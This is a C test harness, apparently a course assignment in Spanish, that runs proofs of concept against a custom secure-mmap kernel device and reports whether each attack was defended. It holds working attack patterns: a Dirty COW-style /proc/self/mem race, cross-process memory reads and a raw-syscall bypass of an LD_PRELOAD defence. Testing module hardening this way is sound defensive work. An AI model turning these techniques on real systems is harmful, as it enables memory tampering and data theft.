// SPDX-License-Identifier: GPL-2.0
/*
 * smm_attacks.c - Pruebas de concepto (PoC) controladas contra mmap()
 *
 * Cada subcomando intenta UN ataque y termina con:
 *     exit 0 -> DEFENDIDO (o uso legitimo correcto)
 *     exit 1 -> VULNERABLE (el ataque tuvo exito)
 *     exit 2 -> ERROR / prueba no concluyente
 *
 * El dispositivo objetivo es /dev/secure_mmap, o el que indique la variable
 * de entorno SMM_DEV (por ejemplo /dev/demo_demand_fault del Paso 6 del
 * profesor, para comparar "sin defensa" vs "con defensa").
 *
 * Uso: smm_attacks <subcomando> [args]   (ver usage())
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <setjmp.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define R_DEF  0
#define R_VULN 1
#define R_ERR  2

static long PG;
static const char *dev;

static int verdict(int r, const char *msg)
{
	static const char *tag[] = { "DEFENDIDO", "VULNERABLE", "ERROR" };

	printf("RESULTADO: %s - %s\n", tag[r], msg);
	return r;
}

static int open_dev(int flags)
{
	int fd = open(dev, flags);

	if (fd < 0) {
		fprintf(stderr, "open(%s): %s\n", dev, strerror(errno));
		exit(R_ERR);
	}
	return fd;
}

static double now_s(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec + ts.tv_nsec / 1e9;
}

static void print_line(const char *p)
{
	const char *nl = memchr(p, '\n', 120);
	int n = nl ? (int)(nl - p) : 120;

	printf("    \"%.*s\"\n", n, p);
}

/* ------------------------------------------------------------------------- */
/* Uso legitimo                                                              */
/* ------------------------------------------------------------------------- */
static int t_legit_read(int argc, char **argv)
{
	long n = argc > 2 ? atol(argv[2]) : 4;
	int fd = open_dev(O_RDONLY);
	char *p = mmap(NULL, n * PG, PROT_READ, MAP_SHARED, fd, 0);

	if (p == MAP_FAILED) {
		printf("mmap: %s\n", strerror(errno));
		return verdict(R_ERR, "el usuario autorizado no pudo mapear");
	}
	printf("Usuario autorizado (uid=%d) lee %ld paginas descifradas:\n", getuid(), n);
	print_line(p);
	print_line(p + (n - 1) * PG);
	munmap(p, n * PG);
	close(fd);
	return verdict(R_DEF, "uso legitimo funciona (texto plano solo para el autorizado)");
}

/* ------------------------------------------------------------------------- */
/* A1/A2: usuario no autorizado                                              */
/* ------------------------------------------------------------------------- */
static int t_unauth_mmap(void)
{
	int fd = open_dev(O_RDONLY);
	char *p = mmap(NULL, PG, PROT_READ, MAP_SHARED, fd, 0);

	printf("uid=%d intenta mmap(PROT_READ, MAP_SHARED) de %s\n", getuid(), dev);
	if (p == MAP_FAILED) {
		printf("mmap -> %s\n", strerror(errno));
		return verdict(errno == EACCES ? R_DEF : R_ERR, "mmap() rechazado al no autorizado");
	}
	printf("Datos expuestos:\n");
	print_line(p);
	return verdict(R_VULN, "un usuario no autorizado leyo la region mapeada");
}

static int t_unauth_read(void)
{
	char buf[128];
	int fd = open_dev(O_RDONLY);
	ssize_t n = read(fd, buf, sizeof(buf) - 1);

	printf("uid=%d intenta read() de %s\n", getuid(), dev);
	if (n < 0) {
		printf("read -> %s\n", strerror(errno));
		return verdict(errno == EACCES ? R_DEF : R_ERR, "read() rechazado al no autorizado");
	}
	buf[n] = '\0';
	print_line(buf);
	return verdict(R_VULN, "un usuario no autorizado leyo por read()");
}

/* ------------------------------------------------------------------------- */
/* A3-A7: banderas peligrosas y escalada con mprotect                        */
/* ------------------------------------------------------------------------- */
static int try_map(int oflags, int prot, int mflags, const char *desc)
{
	int fd = open_dev(oflags);
	void *p = mmap(NULL, PG, prot, mflags, fd, 0);

	printf("Intento: %s\n", desc);
	if (p == MAP_FAILED) {
		printf("mmap -> %s\n", strerror(errno));
		return verdict(R_DEF, "mapeo peligroso rechazado");
	}
	munmap(p, PG);
	return verdict(R_VULN, "el kernel acepto el mapeo peligroso");
}

static int t_mprotect(int oflags, int newprot, const char *desc)
{
	int fd = open_dev(oflags);
	char *p = mmap(NULL, PG, PROT_READ, MAP_SHARED, fd, 0);

	if (p == MAP_FAILED) {
		printf("mmap: %s\n", strerror(errno));
		return verdict(R_ERR, "no se pudo crear el mapeo inicial de solo lectura");
	}
	printf("Mapeo PROT_READ creado en %p. Intento: %s\n", (void *)p, desc);
	if (mprotect(p, PG, newprot) == 0) {
		munmap(p, PG);
		return verdict(R_VULN, "mprotect() elevo los permisos despues del mmap()");
	}
	printf("mprotect -> %s\n", strerror(errno));
	munmap(p, PG);
	return verdict(R_DEF, "no hay escalada de permisos (VM_MAYWRITE/VM_MAYEXEC retirados)");
}

/* ------------------------------------------------------------------------- */
/* A8: estilo Dirty COW (CVE-2016-5195): /proc/self/mem + madvise(DONTNEED)  */
/* ------------------------------------------------------------------------- */
static atomic_int stop_flag;
static char *race_addr;

static void *madvise_loop(void *arg)
{
	long *count = arg;

	while (!atomic_load(&stop_flag)) {
		madvise(race_addr, PG, MADV_DONTNEED);
		(*count)++;
	}
	return NULL;
}

static int t_dirtycow(void)
{
	int fd = open_dev(O_RDONLY);
	char orig[64], after[64];
	long ok = 0, fail = 0, madv = 0;
	int first_err = 0, memfd;
	pthread_t th;
	double end;
	char *p = mmap(NULL, PG, PROT_READ, MAP_PRIVATE, fd, 0);

	if (p == MAP_FAILED) {
		printf("mmap: %s\n", strerror(errno));
		return verdict(R_ERR, "no se pudo mapear MAP_PRIVATE de solo lectura");
	}
	memcpy(orig, p, sizeof(orig));
	race_addr = p;
	memfd = open("/proc/self/mem", O_RDWR);
	if (memfd < 0)
		return verdict(R_ERR, "no se pudo abrir /proc/self/mem");

	printf("Hilo 1: pwrite(/proc/self/mem) sobre %p | Hilo 2: madvise(MADV_DONTNEED) (2 s)\n",
	       (void *)p);
	atomic_store(&stop_flag, 0);
	pthread_create(&th, NULL, madvise_loop, &madv);
	end = now_s() + 2.0;
	while (now_s() < end) {
		if (pwrite(memfd, "PWNED!!", 7, (off_t)(uintptr_t)p) == 7) {
			ok++;
		} else {
			if (!first_err)
				first_err = errno;
			fail++;
		}
	}
	atomic_store(&stop_flag, 1);
	pthread_join(th, NULL);
	close(memfd);
	munmap(p, PG);

	/* Releer el contenido real (mapeo nuevo) para ver si la boveda cambio. */
	p = mmap(NULL, PG, PROT_READ, MAP_SHARED, fd, 0);
	if (p == MAP_FAILED)
		return verdict(R_ERR, "no se pudo volver a mapear para verificar");
	memcpy(after, p, sizeof(after));
	munmap(p, PG);

	printf("Escrituras forzadas exitosas: %ld | fallidas: %ld (%s) | madvise: %ld\n",
	       ok, fail, first_err ? strerror(first_err) : "-", madv);
	printf("Contenido original %s\n",
	       memcmp(orig, after, sizeof(orig)) ? "MODIFICADO" : "intacto");
	if (memcmp(orig, after, sizeof(orig)))
		return verdict(R_VULN, "la escritura forzada llego al contenido original");
	if (ok)
		return verdict(R_VULN, "FOLL_FORCE pudo escribir en un mapeo de solo lectura (copia COW)");
	return verdict(R_DEF, "FOLL_FORCE rechazado: sin COW ni escritura forzada");
}

/* ------------------------------------------------------------------------- */
/* A9: otro proceso del mismo usuario lee el texto plano (process_vm_readv)  */
/* ------------------------------------------------------------------------- */
static int t_remote_read(void)
{
	int to_parent[2], to_child[2];
	uintptr_t addrs[2];
	pid_t pid;
	char buf[64], path[64];
	struct iovec l, r;
	ssize_t n_ctrl, n_vault, n_mem;
	int memfd, e_vault, e_mem = 0;

	if (pipe(to_parent) || pipe(to_child))
		return verdict(R_ERR, "pipe");
	pid = fork();
	if (pid == 0) {
		static char control[64] = "CONTROL: memoria anonima normal del hijo";
		int fd = open_dev(O_RDONLY);
		char *p = mmap(NULL, PG, PROT_READ, MAP_SHARED, fd, 0);
		char c;

		if (p == MAP_FAILED)
			_exit(R_ERR);
		c = *(volatile char *)p;  /* forzar el page fault: texto plano en RAM */
		(void)c;
		addrs[0] = (uintptr_t)control;
		addrs[1] = (uintptr_t)p;
		if (write(to_parent[1], addrs, sizeof(addrs)) != sizeof(addrs))
			_exit(R_ERR);
		if (read(to_child[0], &c, 1) < 0)
			_exit(R_ERR);
		_exit(0);
	}
	if (read(to_parent[0], addrs, sizeof(addrs)) != sizeof(addrs))
		return verdict(R_ERR, "el hijo no pudo mapear");

	l.iov_base = buf;
	l.iov_len = sizeof(buf);
	r.iov_len = sizeof(buf);

	r.iov_base = (void *)addrs[0];
	n_ctrl = process_vm_readv(pid, &l, 1, &r, 1, 0);
	printf("Control (memoria anonima del hijo): %s\n",
	       n_ctrl > 0 ? "leida" : strerror(errno));

	r.iov_base = (void *)addrs[1];
	n_vault = process_vm_readv(pid, &l, 1, &r, 1, 0);
	e_vault = errno;
	printf("process_vm_readv sobre el mapeo protegido: %s\n",
	       n_vault > 0 ? "LEIDO" : strerror(e_vault));
	if (n_vault > 0)
		print_line(buf);

	snprintf(path, sizeof(path), "/proc/%d/mem", pid);
	memfd = open(path, O_RDONLY);
	n_mem = memfd >= 0 ? pread(memfd, buf, sizeof(buf), (off_t)addrs[1]) : -1;
	if (n_mem < 0)
		e_mem = errno;
	printf("pread(%s) sobre el mapeo protegido: %s\n", path,
	       n_mem > 0 ? "LEIDO" : strerror(e_mem));
	if (memfd >= 0)
		close(memfd);

	if (write(to_child[1], "x", 1) != 1)
		perror("write");
	waitpid(pid, NULL, 0);

	if (n_ctrl <= 0)
		return verdict(R_ERR, "el control fallo (ptrace restringido); prueba no concluyente");
	if (n_vault > 0 || n_mem > 0)
		return verdict(R_VULN, "otro proceso leyo el texto plano descifrado");
	return verdict(R_DEF, "VM_IO bloquea get_user_pages(): texto plano aislado del resto");
}

/* ------------------------------------------------------------------------- */
/* A10: herencia por fork()                                                  */
/* ------------------------------------------------------------------------- */
static int t_fork_inherit(void)
{
	int fd = open_dev(O_RDONLY), st;
	char *p = mmap(NULL, PG, PROT_READ, MAP_SHARED, fd, 0);
	pid_t pid;

	if (p == MAP_FAILED)
		return verdict(R_ERR, "no se pudo mapear");
	(void)*(volatile char *)p;
	pid = fork();
	if (pid == 0) {
		char c = *(volatile char *)p;  /* SIGSEGV si el mapeo no se heredo */

		printf("Hijo leyo '%c' del mapeo heredado\n", c);
		_exit(0);
	}
	waitpid(pid, &st, 0);
	if (WIFSIGNALED(st) && WTERMSIG(st) == SIGSEGV) {
		printf("El hijo recibio SIGSEGV al tocar la direccion heredada\n");
		return verdict(R_DEF, "VM_DONTCOPY: fork() no hereda el texto plano");
	}
	return verdict(R_VULN, "el proceso hijo heredo el mapeo descifrado");
}

/* ------------------------------------------------------------------------- */
/* A11: partir / crecer el VMA                                               */
/* ------------------------------------------------------------------------- */
static int t_split(void)
{
	int fd = open_dev(O_RDONLY), vuln = 0;
	char *p = mmap(NULL, 4 * PG, PROT_READ, MAP_SHARED, fd, 0);
	void *q;

	if (p == MAP_FAILED)
		return verdict(R_ERR, "no se pudo mapear 4 paginas");
	if (munmap(p + PG, PG) == 0) {
		printf("munmap parcial: PERMITIDO\n");
		vuln = 1;
	} else {
		printf("munmap parcial -> %s\n", strerror(errno));
	}
	if (!vuln && mprotect(p, PG, PROT_NONE) == 0) {
		printf("mprotect parcial: PERMITIDO\n");
		vuln = 1;
	} else if (!vuln) {
		printf("mprotect parcial -> %s\n", strerror(errno));
	}
	q = mremap(p, 4 * PG, 8 * PG, 0);
	if (q != MAP_FAILED) {
		printf("mremap para crecer: PERMITIDO\n");
		vuln = 1;
	} else {
		printf("mremap crecer -> %s\n", strerror(errno));
	}
	return vuln ? verdict(R_VULN, "el VMA se pudo partir o crecer")
		    : verdict(R_DEF, "VMA indivisible y de tamano fijo");
}

/* ------------------------------------------------------------------------- */
/* A12: integridad (tras echo "corrupt N" > /proc/secure_mmap)               */
/* ------------------------------------------------------------------------- */
static sigjmp_buf jb;

static void on_sigbus(int sig)
{
	siglongjmp(jb, sig);
}

static int t_integrity(int argc, char **argv)
{
	long idx = argc > 2 ? atol(argv[2]) : 3;
	int fd = open_dev(O_RDONLY);
	char *p = mmap(NULL, PG, PROT_READ, MAP_SHARED, fd, idx * PG);
	char buf[64];
	volatile int got_bus = 0;

	if (p == MAP_FAILED)
		return verdict(R_ERR, "no se pudo mapear la pagina");
	signal(SIGBUS, on_sigbus);
	if (sigsetjmp(jb, 1) == 0) {
		char c = *(volatile char *)p;

		printf("Lectura de la pagina %ld entrego datos: '%c'\n", idx, c);
	} else {
		got_bus = 1;
		printf("Lectura de la pagina %ld -> SIGBUS\n", idx);
	}
	signal(SIGBUS, SIG_DFL);
	if (pread(fd, buf, sizeof(buf), idx * PG) < 0)
		printf("read() de la pagina %ld -> %s\n", idx, strerror(errno));
	else
		printf("read() de la pagina %ld entrego datos\n", idx);

	return got_bus ? verdict(R_DEF, "pagina manipulada detectada; no se entrego texto alterado")
		       : verdict(R_VULN, "se entregaron datos manipulados sin detectarlo");
}

/* ------------------------------------------------------------------------- */
/* A13: carrera madvise(MADV_DONTNEED) vs escrituras (requiere allow_write=1) */
/* ------------------------------------------------------------------------- */
static int t_madvise_race(void)
{
	int fd = open_dev(O_RDWR);
	char saved[64];
	long madv = 0;
	uint64_t i = 0, last = 0, got;
	pthread_t th;
	double end;
	char *p;

	if (pread(fd, saved, sizeof(saved), 0) != sizeof(saved))
		return verdict(R_ERR, "no se pudo leer el contenido original");
	p = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (p == MAP_FAILED) {
		printf("mmap RW: %s (cargue el modulo con allow_write=1)\n", strerror(errno));
		return verdict(R_ERR, "se requiere allow_write=1");
	}
	race_addr = p;
	atomic_store(&stop_flag, 0);
	pthread_create(&th, NULL, madvise_loop, &madv);
	end = now_s() + 2.0;
	while (now_s() < end) {
		*(volatile uint64_t *)p = ++i;
		last = i;
	}
	atomic_store(&stop_flag, 1);
	pthread_join(th, NULL);
	munmap(p, PG);  /* aqui el modulo re-cifra la pagina modificada */

	if (pread(fd, &got, sizeof(got), 0) != sizeof(got))
		return verdict(R_ERR, "no se pudo releer");
	printf("Escrituras: %llu | madvise(DONTNEED): %ld | ultimo valor escrito: %llu | valor persistido: %llu\n",
	       (unsigned long long)i, madv, (unsigned long long)last, (unsigned long long)got);

	if (pwrite(fd, saved, sizeof(saved), 0) != sizeof(saved))
		printf("(aviso) no se pudo restaurar el contenido original\n");
	close(fd);
	return got == last ? verdict(R_DEF, "sin escrituras perdidas ni corrupcion bajo la carrera")
			   : verdict(R_VULN, "se perdieron escrituras durante la carrera");
}

/* ------------------------------------------------------------------------- */
/* A14: evadir una "defensa" LD_PRELOAD con la syscall directa               */
/* ------------------------------------------------------------------------- */
static int t_raw_bypass(int argc, char **argv)
{
	const char *path = argc > 2 ? argv[2] : dev;
	int fd = open(path, O_RDONLY);
	void *p;
	long r;

	if (fd < 0)
		return verdict(R_ERR, "no se pudo abrir el archivo");
	p = mmap(NULL, PG, PROT_READ, MAP_SHARED, fd, 0);
	printf("1) mmap() de libc (pasa por LD_PRELOAD): %s\n",
	       p == MAP_FAILED ? strerror(errno) : "mapeado");
	r = syscall(SYS_mmap, NULL, PG, PROT_READ, MAP_SHARED, fd, 0);
	if (r == -1) {
		printf("2) syscall(SYS_mmap) directa (ignora LD_PRELOAD): %s\n", strerror(errno));
		return verdict(R_DEF, "la defensa en el KERNEL detuvo la syscall directa");
	}
	printf("2) syscall(SYS_mmap) directa (ignora LD_PRELOAD): MAPEADO\n");
	print_line((char *)r);
	return verdict(R_VULN, "LD_PRELOAD fue evadido: una defensa en espacio de usuario no basta");
}

/* ------------------------------------------------------------------------- */
/* Archivo real: mmap compartido escribible (lo audita el kprobe)            */
/* ------------------------------------------------------------------------- */
static int t_map_file(int argc, char **argv)
{
	const char *path = argc > 2 ? argv[2] : "/tmp/secreto.txt";
	int rw = argc > 3 && !strcmp(argv[3], "rw");
	int fd = open(path, rw ? O_RDWR : O_RDONLY);
	void *p;

	if (fd < 0)
		return verdict(R_ERR, "no se pudo abrir el archivo");
	p = mmap(NULL, PG, rw ? PROT_READ | PROT_WRITE : PROT_READ, MAP_SHARED, fd, 0);
	printf("mmap(%s, %s, MAP_SHARED): %s\n", path, rw ? "RW" : "R",
	       p == MAP_FAILED ? strerror(errno) : "OK");
	if (p != MAP_FAILED)
		munmap(p, PG);
	close(fd);
	return p == MAP_FAILED ? R_ERR : R_DEF;
}

/* ------------------------------------------------------------------------- */
/* Pregunta 8: O_RDONLY + PROT_WRITE + MAP_PRIVATE sobre un archivo normal   */
/* ------------------------------------------------------------------------- */
static int t_q8(int argc, char **argv)
{
	const char *path = argc > 2 ? argv[2] : "/etc/hostname";
	int fd = open(path, O_RDONLY);
	char disk[32] = { 0 };
	char *p;

	if (fd < 0)
		return verdict(R_ERR, "no se pudo abrir el archivo");
	p = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	printf("O_RDONLY + PROT_WRITE + MAP_SHARED : %s\n",
	       p == MAP_FAILED ? strerror(errno) : "permitido (!)");
	if (p != MAP_FAILED)
		munmap(p, PG);
	p = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (p == MAP_FAILED)
		return verdict(R_ERR, "MAP_PRIVATE tambien fallo");
	printf("O_RDONLY + PROT_WRITE + MAP_PRIVATE: permitido\n");
	memcpy(p, "MODIFICADO-EN-RAM", 17);
	printf("En la copia privada (COW) del proceso: \"%.17s\"\n", p);
	if (pread(fd, disk, 17, 0) < 0)
		perror("pread");
	printf("En el archivo real (page cache/disco): \"%.17s\"\n", disk);
	munmap(p, PG);
	close(fd);
	printf("RESULTADO: INFO - el kernel lo permite porque la escritura nunca vuelve al archivo\n");
	return R_DEF;
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"Uso: %s <subcomando> [args]\n"
		"  legit_read [n]        uso legitimo: mapear y leer n paginas\n"
		"  unauth_mmap           mmap() por un usuario no autorizado\n"
		"  unauth_read           read() por un usuario no autorizado\n"
		"  shared_write          MAP_SHARED|PROT_WRITE (allow_write=0)\n"
		"  private_write         MAP_PRIVATE|PROT_WRITE (Copy-On-Write)\n"
		"  exec_map              PROT_EXEC (inyeccion de codigo)\n"
		"  mprotect_write        RO -> mprotect(PROT_WRITE)\n"
		"  mprotect_exec         RO -> mprotect(PROT_EXEC)\n"
		"  dirtycow              /proc/self/mem + madvise(DONTNEED)\n"
		"  remote_read           process_vm_readv / /proc/pid/mem desde otro proceso\n"
		"  fork_inherit          heredar el mapeo con fork()\n"
		"  split                 munmap/mprotect parcial y mremap\n"
		"  integrity [pag]       leer una pagina manipulada\n"
		"  madvise_race          carrera DONTNEED vs escritura (allow_write=1)\n"
		"  raw_bypass [ruta]     evadir LD_PRELOAD con syscall(SYS_mmap)\n"
		"  map_file ruta [rw]    mmap de un archivo real (auditado por el kprobe)\n"
		"  q8 [ruta]             demostracion de la pregunta 8\n"
		"Variable SMM_DEV: dispositivo objetivo (por defecto /dev/secure_mmap)\n",
		prog);
}

int main(int argc, char **argv)
{
	const char *cmd;

	setvbuf(stdout, NULL, _IOLBF, 0);
	PG = sysconf(_SC_PAGESIZE);
	dev = getenv("SMM_DEV") ? getenv("SMM_DEV") : "/dev/secure_mmap";
	if (argc < 2) {
		usage(argv[0]);
		return R_ERR;
	}
	cmd = argv[1];

	if (!strcmp(cmd, "legit_read"))
		return t_legit_read(argc, argv);
	if (!strcmp(cmd, "unauth_mmap"))
		return t_unauth_mmap();
	if (!strcmp(cmd, "unauth_read"))
		return t_unauth_read();
	if (!strcmp(cmd, "shared_write"))
		return try_map(O_RDWR, PROT_READ | PROT_WRITE, MAP_SHARED,
			       "O_RDWR + mmap(PROT_READ|PROT_WRITE, MAP_SHARED)");
	if (!strcmp(cmd, "private_write"))
		return try_map(O_RDONLY, PROT_READ | PROT_WRITE, MAP_PRIVATE,
			       "O_RDONLY + mmap(PROT_READ|PROT_WRITE, MAP_PRIVATE)");
	if (!strcmp(cmd, "exec_map"))
		return try_map(O_RDONLY, PROT_READ | PROT_EXEC, MAP_SHARED,
			       "mmap(PROT_READ|PROT_EXEC, MAP_SHARED)");
	if (!strcmp(cmd, "mprotect_write"))
		return t_mprotect(O_RDWR, PROT_READ | PROT_WRITE,
				  "fd O_RDWR, mprotect(PROT_READ|PROT_WRITE)");
	if (!strcmp(cmd, "mprotect_exec"))
		return t_mprotect(O_RDONLY, PROT_READ | PROT_EXEC, "mprotect(PROT_READ|PROT_EXEC)");
	if (!strcmp(cmd, "dirtycow"))
		return t_dirtycow();
	if (!strcmp(cmd, "remote_read"))
		return t_remote_read();
	if (!strcmp(cmd, "fork_inherit"))
		return t_fork_inherit();
	if (!strcmp(cmd, "split"))
		return t_split();
	if (!strcmp(cmd, "integrity"))
		return t_integrity(argc, argv);
	if (!strcmp(cmd, "madvise_race"))
		return t_madvise_race();
	if (!strcmp(cmd, "raw_bypass"))
		return t_raw_bypass(argc, argv);
	if (!strcmp(cmd, "map_file"))
		return t_map_file(argc, argv);
	if (!strcmp(cmd, "q8"))
		return t_q8(argc, argv);
	usage(argv[0]);
	return R_ERR;
}
